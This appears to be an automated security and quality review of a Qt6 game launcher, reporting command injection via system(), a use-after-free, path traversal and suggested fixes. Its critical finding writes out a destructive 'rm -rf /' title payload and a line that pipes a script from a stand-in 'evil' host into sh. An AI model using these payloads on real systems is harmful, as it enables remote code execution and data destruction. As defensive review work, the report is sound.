---
phase: launcher
reviewed: 2026-05-09T12:00:00Z
depth: deep
files_reviewed: 7
files_reviewed_list:
  - launcher/main.cpp
  - launcher/project_manager.cpp
  - launcher/project_manager.hpp
  - launcher/config.cpp
  - launcher/config.hpp
  - launcher/theme.hpp
  - launcher/templates.hpp
findings:
  critical: 2
  warning: 13
  info: 4
  total: 19
status: issues_found
---

# Launcher Subsystem: Code Review Report

**Reviewed:** 2026-05-09T12:00:00Z
**Depth:** Deep (cross-file analysis, call chain tracing, thread safety, security)
**Files Reviewed:** 7 (main.cpp, project_manager.{cpp,hpp}, config.{cpp,hpp}, theme.hpp, templates.hpp)
**Status: issues_found** — 2 critical, 13 warnings, 4 info

## Summary

The launcher (Qt6 app) has solid UI styling and a clean layout, but contains **two critical security flaws** — command injection in the packaging pipeline and a use-after-free in detached threads — plus systemic quality issues around input sanitization, error handling, and cross-platform correctness. The `doPackage()` function uses `system()` to invoke `tar`/`zip` with unsanitized user data from `game.cfg`, enabling arbitrary command execution when a user opens and packages a malicious project. Detached threads in both `doLaunch()` and `doPackage()` capture a dangling `this` pointer if the window closes during an operation. Below the surface, path traversal in project creation, fragile config parsing, unchecked I/O errors, and a growing god class in `main.cpp` compound the risk profile.

---

## Critical Issues

### CR-01: Command injection via game.cfg title in system() archiving

**File:** `launcher/main.cpp:926-952`
**Issue:** `doPackage()` builds shell command strings by concatenating the game title (read from `game.cfg`) directly into `system()` calls without escaping. The title is user-controlled data — it comes from the project's config file, which an attacker can craft. Shell metacharacters such as `"`, `` ` ``, `$()`, and `;` inside the title are interpreted by the shell, enabling arbitrary command execution.

Three vulnerable call sites:

1. **Line 929** (Linux tar):
   ```cpp
   std::string cmd = "tar czf \"" + archivePath.string() + "\" -C \"" +
                     projectDir.parent_path().string() + "\" \"" +
                     stagingName + "\" 2>&1";
   ret = system(cmd.c_str());
   ```
   If `gameName` = `x"; rm -rf /; "x`, then `stagingName` = `x"; rm -rf /; "x-linux`, and the command becomes:
   ```
   tar czf ".../x"; rm -rf /; "x-linux.tar.gz" -C "/path" "x"; rm -rf /; "x-linux" 2>&1
   ```
   The embedded `"` closes the quote, and `; rm -rf / ;` executes as a separate command.

2. **Line 938** (Windows PowerShell):
   ```cpp
   std::string cmd =
       "powershell -NoProfile -Command \"Compress-Archive -Force"
       " -Path '" + stagingDir.string() +
       "' -DestinationPath '" + archivePath.string() + "\" 2>&1";
   ```
   Single quotes in PowerShell don't prevent `'`-breaking or variable expansion. A title containing `'` breaks the quoting.

3. **Line 949-951** (Linux zip fallback):
   ```cpp
   std::string cmd = "cd \"" + projectDir.parent_path().string() +
                     "\" && zip -r \"" + archivePath.string() +
                     "\" \"" + stagingName + "\" 2>&1";
   ```
   Same injection surface as the tar variant.

The `gameName` has spaces replaced with underscores (line 796-797), but `"`, `` ` ``, `$`, `;`, `|`, `&`, `(`, `)` are all left intact and exploitable inside double-quoted shell strings.

**Attack scenario:** An attacker crafts a `.crka` project with a `game.cfg` containing `title = "; curl http://evil/shell.sh | sh ;"`. When the victim opens the project in the launcher and clicks "Package", arbitrary commands execute.

**Fix:** Replace `system()` with a proper API that does not invoke a shell. Options:

- **Preferred:** Use a C++ archiving library (e.g., libarchive, minizip, or Qt's `QZipWriter`) to avoid shell invocation entirely.
- **Minimal fix:** Before constructing the command, validate that the game name contains only `[a-zA-Z0-9_-]` characters for the purpose of archive naming. Reject or sanitize to a safe character class:
  ```cpp
  std::string safeName = gameName;
  for (char &c : safeName) {
      if (!std::isalnum(static_cast<unsigned char>(c)) && c != '_' && c != '-')
          c = '_';
  }
  ```
  This does NOT fix the underlying `system()` issue (other path components could also contain shell metacharacters), but is a defense-in-depth step.

---

### CR-02: Use-after-free in detached threads accessing destroyed LauncherWindow

**File:** `launcher/main.cpp:682-780` (doLaunch), `launcher/main.cpp:792-978` (doPackage)

**Issue:** Both `doLaunch()` and `doPackage()` spawn detached threads that capture `this` (the `LauncherWindow` instance):
```cpp
std::thread([this]() {
    // ... long-running work ...
    QMetaObject::invokeMethod(this, [this]() {
        m_statusLabel->setText("");
        setProjectUiEnabled(true);
        updateLog();
    }, Qt::QueuedConnection);
}).detach();
```

If the user closes the launcher window while a game is running or packaging is in progress, `LauncherWindow` is destroyed before the thread finishes. The `this` pointer becomes dangling. When the thread later calls `QMetaObject::invokeMethod(this, ...)`, it invokes a function on the destroyed `QObject` — formally undefined behavior. In practice this can cause a crash or memory corruption, depending on timing.

The `s_busy` atomic prevents re-entrant invocations but does not protect against window destruction.

**Fix:** Several options, in order of preference:

1. **Make the thread a member and join on close:**
   ```cpp
   // In LauncherWindow:
   std::thread m_workThread;
   bool m_workActive = false;

   ~LauncherWindow() {
       if (m_workActive && m_workThread.joinable())
           m_workThread.join();  // or detach() after flag
   }
   ```

2. **Use `QThread` with proper lifetime management:**
   Move the launch/package logic to a `QObject` worker that is moved to a `QThread`. The worker's lifetime is tied to the thread, and the thread can be properly quit/wait on destruction.

3. **Add a cancellation flag** that the thread checks periodically, and set it in the window's `closeEvent`:
   ```cpp
   void closeEvent(QCloseEvent *e) override {
       if (s_busy) {
           m_cancelRequested = true;
           // Optionally wait with a timeout
           e->ignore();  // or accept after cleanup
       }
   }
   ```

---

## Warnings

### WR-01: Path traversal in createProject via unsanitized project name

**File:** `launcher/main.cpp:604-618` → `launcher/project_manager.cpp:78-83`

**Issue:** `doNewProject()` collects a user-provided name via `QInputDialog::getText()` and passes it directly to `ProjectManager::createProject()`, which concatenates it to the projects directory path:
```cpp
fs::path projectPath = projectsDir / name;
```
A name containing `../` would cause directory traversal: `createProject("../../Evil")` creates a project at `{projectsDir}/../../Evil`, which is outside the intended scope. While `QInputDialog` typically doesn't allow `/` in input on most platforms, this is defense-in-depth and should not rely on platform-specific dialog behavior. Additionally, command-line or future programmatic callers wouldn't have this protection.

**Fix:** Validate the project name before creating the directory:
```cpp
bool ProjectManager::createProject(const std::string &name)
{
    // Reject empty names, names with path separators, or names that would traverse
    if (name.empty() || name.find('/') != std::string::npos || name.find('\\') != std::string::npos
        || name.find("..") != std::string::npos)
        return false;
    // ...
}
```

---

### WR-02: RenameProject fails on case-insensitive filesystems (Windows/NTFS)

**File:** `launcher/project_manager.cpp:206`

**Issue:** The rename guard incorrectly rejects case-only renames on case-insensitive filesystems:
```cpp
if (fs::exists(newPath) && newPath != oldPath)
    return false;
```
On Windows/NTFS, `fs::exists("FOO")` returns `true` when `Foo` exists. `newPath != oldPath` is a lexicographic comparison, so `"FOO" != "Foo"` is `true`. The condition short-circuits to `true`, returning `false` — blocking the rename even though renaming "Foo" → "FOO" is valid (and should just update the case on NTFS).

**Fix:** Use `fs::equivalent()` to check if the paths point to the same file before rejecting:
```cpp
if (fs::exists(newPath) && !fs::equivalent(newPath, oldPath))
    return false;
```
Or perform the rename unconditionally and let the filesystem reject it if the target actually exists:
```cpp
std::error_code ec;
fs::rename(oldPath, newPath, ec);
if (ec)
    return false;
```

---

### WR-03: Fragile title parsing in listProjects / renameProject / loadGameCfg

**File:** `launcher/project_manager.cpp:57, 222, 275`

**Issue:** All three functions parse the `title` field from `game.cfg` using:
```cpp
if (line.find("title") == 0 && line.find('=') != std::string::npos) {
```
This matches any line starting with `title`, including:
- `title_note = something` (would be interpreted as the game title)
- `title = foo` (correct)
- `title=foo` (correct but spacing differs from canonical format)

The parsing is also fragile in other ways:
- Lines like `#title = foo` (commented out) are correctly skipped due to the `find("title") == 0` check, since `#` precedes `title`.
- But `title_str = foo` is incorrectly matched.

**Fix:** Use a more precise match, e.g., checking the exact key naming convention:
```cpp
if (line.compare(0, 6, "title ") == 0 || line.compare(0, 6, "title\t") == 0
    || line.compare(0, 7, "title =") == 0 || line.compare(0, 6, "title=") == 0) {
```
Or better, use a regex:
```cpp
if (line.find("title") == 0) {
    size_t eq = line.find_first_of("=:");
    if (eq == std::string::npos) continue;
    std::string key = trim(line.substr(0, eq));
    if (key == "title") {
        // ...
    }
}
```

---

### WR-04: Windows CreateProcessA command line injection via project path

**File:** `launcher/main.cpp:730-731`

**Issue:** On Windows, `doLaunch()` constructs the command line for `CreateProcessA` via string concatenation:
```cpp
std::string cmd = "\"" + runner + "\" \"" + path.string() + "\"";
BOOL ok = CreateProcessA(NULL, (char *)cmd.c_str(), NULL, NULL, TRUE, 0,
                         NULL, path.string().c_str(), &si, &pi);
```
If the project path contains a double-quote character (e.g., a project folder named `Project"Name`), the command-line string becomes `"runner" "Project"Name"`. Windows command-line parsing would interpret this as three arguments: `runner`, `Project`, and `Name"` — the closing quote on the project path would be consumed early, and the remaining `Name"` would be a separate argument (possibly causing `CreateProcess` to fail or launch with wrong arguments).

Additionally, `CreateProcessA` with `NULL` as `lpApplicationName` means Windows must parse the first quoted token from `lpCommandLine` to find the executable. Complex paths with embedded quotes could cause the wrong executable to be launched.

**Fix:** Use `CreateProcessA` with the executable path separated from arguments:
```cpp
std::string appPath = runner;
std::string args = "\"" + path.string() + "\"";
BOOL ok = CreateProcessA(appPath.c_str(), (char *)args.c_str(), ...);
```
This avoids the ambiguous executable parsing. Additionally, validate or escape `"` in the path before constructing the command line.

---

### WR-05: No error checking on file writes during project creation

**File:** `launcher/project_manager.cpp:110-127`

**Issue:** Multiple `std::ofstream` opens in `createProject()` and `initProject()` do not check whether the file was successfully opened or written:
```cpp
std::ofstream cfgFile((projectPath / "game.cfg").string());
cfgFile << cfgContent;
```
```cpp
std::ofstream f2((projectPath / "assets/scripts/ui.crka").string());
f2 << kUiScriptTemplate;
```
If the disk is full, the directory is not writable, or the path is invalid, these writes silently fail. The project would be partially created, and the user sees no error (until they try to use the project later).

**Fix:** Check each write:
```cpp
std::ofstream cfgFile((projectPath / "game.cfg").string());
cfgFile << cfgContent;
if (!cfgFile.good()) {
    // Cleanup and return false
}
```
Or use a helper function that returns success/failure, similar to `writeAsset()`:
```cpp
static bool writeTextFile(const fs::path &dest, const std::string &content) {
    std::ofstream f(dest);
    if (!f) return false;
    f << content;
    return f.good();
}
```

---

### WR-06: Unchecked chdir() in forked child process

**File:** `launcher/main.cpp:757`

**Issue:** In the Linux `doLaunch()` fork path, the child process calls `chdir()` without checking the return value:
```cpp
chdir(path.string().c_str());
execlp(runner.c_str(), runner.c_str(), path.string().c_str(), nullptr);
```
If `chdir()` fails (e.g., the project directory was deleted between the click and the fork), the game process starts with the wrong working directory. It might fail to find assets, or worse, write save data to the wrong location.

**Fix:** Check the return value and `_exit(1)` on failure:
```cpp
if (chdir(path.string().c_str()) != 0)
    _exit(1);
```

---

### WR-07: Incomplete cleanup on failed project creation

**File:** `launcher/project_manager.cpp:129-141`

**Issue:** In `createProject()`, asset files are written sequentially. If `writeAsset()` fails midway (e.g., `kBgPng` succeeds but `kCharPng` fails), the earlier files remain in place. The project directory exists with partial content. The caller (`doNewProject`) only logs an error but doesn't attempt cleanup.

Additionally, the directory structure created by `create_directories` (lines 88-93) is never cleaned up on failure.

**Fix:** On failure, clean up the partially-created project:
```cpp
if (!writeAsset(projectPath / "assets/bg/placeholder_bg.png", kBgPng, kBgPng_len)
    || !writeAsset(projectPath / "assets/characters/placeholder_char.png", kCharPng, kCharPng_len)
    /* ... */) {
    fs::remove_all(projectPath, ec);  // best-effort cleanup
    return false;
}
```

---

### WR-08: LauncherWindow is a god class

**File:** `launcher/main.cpp:137-1013`

**Issue:** `LauncherWindow` (877 lines of class body) contains all UI building, project management, process spawning, archiving logic, and threading in a single class. Responsibilities include:
- Window layout, sidebar, project list, and content panels
- Font loading and theme application
- Game launching (fork/CreateProcess + pipe reading)
- Packaging (file copying, directory iteration, tar/zip via system())
- Navigation (page transitions, fade animation state machine)
- Log management (thread-safe global log + UI updates)
- Error handling and status display

This violates the Single Responsibility Principle and makes the class difficult to test, maintain, or reason about. The 1032-line file is approaching unmaintainable.

**Fix:** Extract into separate concerns:
- `GameRunner` — handles `fork()`/`CreateProcess` logic and pipe draining
- `PackageManager` — handles staging, file copying, and archiving
- `BuildOutputModel` — manages the log state separate from UI

These could be `QObject` workers moved to `QThread` instances, which would also solve CR-02.

---

### WR-09: `system()` for archiving is non-portable and fragile

**File:** `launcher/main.cpp:926-956`

**Issue:** The packaging pipeline depends on external command-line tools (`tar`, `zip`, `powershell`). Weaknesses include:

1. **No `which` check for `tar` on Linux** — unlike the `zip` path which has a guard (line 942), the `tar` path (line 926) assumes `tar` is always available. On minimal Docker images or Alpine Linux, `tar` may not be installed.

2. **No error output capture** — `2>&1` redirects stderr to stdout, but the output is discarded; only the exit code is checked. Diagnostic information from `tar`/`zip` failures is lost.

3. **PowerShell on Windows** — The Windows path (line 934-940) uses `powershell -Command` which requires PowerShell to be installed and enabled. On Windows Server Core or minimal installs, PowerShell may not be available.

4. **`system()` itself** — Blocks the calling thread until the child process exits. Combined with the detached thread pattern, there is no way to cancel or monitor progress.

**Fix:** Use a C++ archiving library (libarchive, minizip, Qt's `QZipWriter`) for platform-independent archiving without shell invocation. This also eliminates CR-01.

---

### WR-10: readlink truncation not detected

**File:** `launcher/main.cpp:76-78`

**Issue:** `selfExeDir()` on Linux uses a fixed 2048-byte buffer for `readlink("/proc/self/exe", ...)`:
```cpp
char buf[2048] = {};
ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
```
If the executable path exceeds 2047 bytes, the result is silently truncated. While extremely unlikely on normal systems, this is a correctness issue — especially if the executable is deep in the filesystem (e.g., inside a long build path or a container mount).

**Fix:** Use a dynamically-sized approach:
```cpp
std::string selfExeDir()
{
    std::string buf;
    buf.resize(4096);
    ssize_t len;
    while ((len = readlink("/proc/self/exe", buf.data(), buf.size())) == static_cast<ssize_t>(buf.size()))
        buf.resize(buf.size() * 2);
    if (len > 0) {
        buf.resize(len);
        return fs::path(buf).parent_path();
    }
    return fs::current_path();
}
```

---

### WR-11: Detached threads lack cancellation or join mechanism

**File:** `launcher/main.cpp:682, 792`

**Issue:** Both `doLaunch()` and `doPackage()` spawn threads with `.detach()`. There is no mechanism to:
- Cancel an in-progress operation
- Wait for completion before shutting down
- Monitor progress (the log is fire-and-forget)
- Detect when the launched game process exits (no return code handling)

Line 774: `s_busy = false;` runs in the thread, but nothing reads the exit code of the child process (on Linux: `waitpid` discards the status; on Windows: `WaitForSingleObject` doesn't capture the exit code).

**Fix:** Store the `std::thread` as a member, provide a `cancel()` method, and expose process exit codes via a signal:
```cpp
void doLaunch() {
    m_workThread = std::thread([this]() {
        // ... launch and wait ...
        int exitCode = /* collect from waitpid/GetExitCodeProcess */;
        QMetaObject::invokeMethod(this, [this, exitCode]() {
            emit gameFinished(exitCode);
        }, Qt::QueuedConnection);
    });
}
```

---

### WR-12: `copyTree` lambda reuses shared `ec` by reference

**File:** `launcher/main.cpp:899-915`

**Issue:** The recursive `copyTree` lambda captures `ec` (a `std::error_code`) by reference. Both `fs::directory_iterator` and `fs::copy_file` write to this same `ec`. If an intermediate operation sets an error code, subsequent operations may not overwrite it (if they succeed), and the stale error code could be misinterpreted after `copyTree` returns.

Additionally, `copyTree` is called at line 916, and `ec` is never checked afterward — the outer code proceeds to `appendLog("Creating archive...")` regardless of whether the copy succeeded. Silent data loss if project files couldn't be copied.

**Fix:** Use separate `ec` scopes, or at minimum check `ec` after `copyTree` returns and log/abort the packaging step:
```cpp
copyTree(projectDir, stagingDir);
if (ec) {
    appendLog("[ERROR] File copy failed: " + ec.message());
    fs::remove_all(stagingDir, ec);
    continue;
}
```

---

### WR-13: `kGameCfgTemplate` is dead code

**File:** `launcher/templates.hpp:7-19`

**Issue:** `kGameCfgTemplate` is defined as a static C-string but never referenced by any `.cpp` file. Both `project_manager::createProject()` and `project_manager::initProject()` generate `game.cfg` inline rather than using the template. This is dead code that will decay out of sync with the actual generated format.

**Fix:** Either use `kGameCfgTemplate` in both `createProject()` and `initProject()`, or remove it entirely.

---

## Info

### IN-01: No macOS support in selfExeDir()

**File:** `launcher/main.cpp:68-81`

**Issue:** `selfExeDir()` only handles `_WIN32` and Linux (`/proc/self/exe`). On macOS, the fallback is `fs::current_path()` which gives the working directory, not the executable directory. This means runtime discovery on macOS would be incorrect. Cereka targets Linux and Windows, so this is not a bug for current targets — but it's an architectural landmine for future porting and worth documenting.

### IN-02: Casting away const in CreateProcessA call

**File:** `launcher/main.cpp:731`

**Issue:** `CreateProcessA(NULL, (char *)cmd.c_str(), ...)` casts away `const` from the `std::string::c_str()` result. While the Win32 API documents that it does not modify the string, the cast is technically undefined behavior according to the C++ standard. Use `&cmd[0]` or a `std::vector<char>` instead for guaranteed-writable memory.

### IN-03: Config::instance() is a file-backed singleton with no error reporting

**File:** `launcher/config.cpp:36-51`

**Issue:** `Config::load()` silently ignores all I/O errors. If the config file is corrupted, the `projects_dir` field simply stays empty (treated as "first launch"). There's no log message, no diagnostic, and no recovery mechanism. A one-line message to `stderr` (which is redirected to a log file in `main()`) would help diagnose user issues.

### IN-04: Full-text replacement strategy in updateLog()

**File:** `launcher/main.cpp:981-986`

**Issue:** `updateLog()` replaces the entire `QTextEdit` content on every log line. For long-running packaging operations that copy many files, each line triggers a full UI text replacement. A more efficient approach would append to the end of the document, maintaining a cursor at the bottom. This is a performance note, not a correctness issue — per review guidelines, performance is out-of-scope for v1, but the pattern is noted because it causes visible UI stutter during packaging.

---

_Reviewed: 2026-05-09T12:00:00Z_
_Reviewer: gsd-code-reviewer_
_Depth: deep_
